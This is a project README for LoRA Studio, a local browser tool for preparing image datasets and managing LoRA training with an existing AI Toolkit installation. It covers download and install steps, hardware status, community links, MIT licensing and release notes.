# LoRA Studio

Public source for a local browser interface that prepares image datasets, edits captions, manages LoRA training with an existing AI Toolkit installation, and exports adapters to ComfyUI.

**Free software access: no Ko-fi membership is required.** Paid character-model early access and community rewards are separate benefits governed by their own terms.

## Download and install

[Download LoRA Studio — application and source ZIP](https://github.com/TigerFan69/lora-studio/raw/refs/heads/main/LoRA-Studio-2026-10-23.zip). Extract it and open the `LoRA-Studio/studio` folder. No account or membership is required to download. All application source is inside the archive; this is not a compiled desktop installer.

This is the complete Studio application source, including its web interface, installer, training profiles, optional command-line helpers, tests and guides. It is not an all-in-one AI training environment and contains no model weights.

1. Read `docs/PREREQUISITES.md` inside the archive. You need Linux, an NVIDIA GPU, Python 3.12, a working compatible AI Toolkit installation with its training dependencies, and the separately licensed models for your selected profile.
2. Follow `docs/INSTALL.md` inside the archive. Use the existing toolkit environment; do not replace a working Torch/CUDA installation just to add Studio.
3. From `studio`, configure it with `python3 install.py --toolkit /path/to/ai-toolkit`. The installer prints the startup command. Run it and open `http://127.0.0.1:8765` on that host. Settings and runtime data are created locally, not supplied in this repository.
4. Create a project, add images, review captions, prepare a dataset revision, and confirm the selected model profile before a short training test. The interface supports Schnell, Dev and Krea 2 RAW profiles when their required assets and trainer are present.

The application has filesystem access and no login. Keep it on loopback or your private Tailscale connection; do not expose the service directly to the internet. Public source availability does not make your running training server public.

## Status and hardware

This is an early technical release for existing training hosts. A fresh-machine installation is not yet verified. The development baseline is Linux with an RTX 4080 16 GB, about 32 GB system RAM and swap; its AI Toolkit runtime includes local memory changes.

Current development focuses on Krea 2 LoRAs for 12 GB VRAM cards, with 8 GB as an eventual goal. Neither is certified compatibility for this release. See `docs/VALIDATION.md` inside the archive for the measured tests. The unchanged core application passed 36 software tests in an isolated copy of the existing environment; those tests do not certify training quality or VRAM fit.

## Feedback and community

Report setup issues and suggestions in [GitHub Issues](https://github.com/TigerFan69/lora-studio/issues), including hardware, selected profile and redacted logs. Never post credentials or private datasets.

Optional [Ko-fi support and character rewards](https://ko-fi.com/tigerfan69) are separate from free access to this source. [Civitai creator profile](https://civitai.red/user/TigerFan69) contains character-model releases with their own access and license conditions.

## License and releases

Studio source is MIT licensed; see [LICENSE](LICENSE). AI Toolkit and all models retain their own licenses. Attribution for the optional legacy-loader helper is in `docs/THIRD-PARTY.md` inside the archive.

This is the main public application repository. The separate `lora-studio-preview` repository retains its previously scheduled October 29, 2026, 11:59 p.m. Central download-window closure. That schedule does not close this repository. Downloaded MIT copies remain usable and redistributable.

Package update: restores the in-app Help guide omitted from the earlier preview ZIP. Installer and Help/static-page smoke checks passed on the existing Linux training host in a new temporary folder. No service was started and no training was launched.
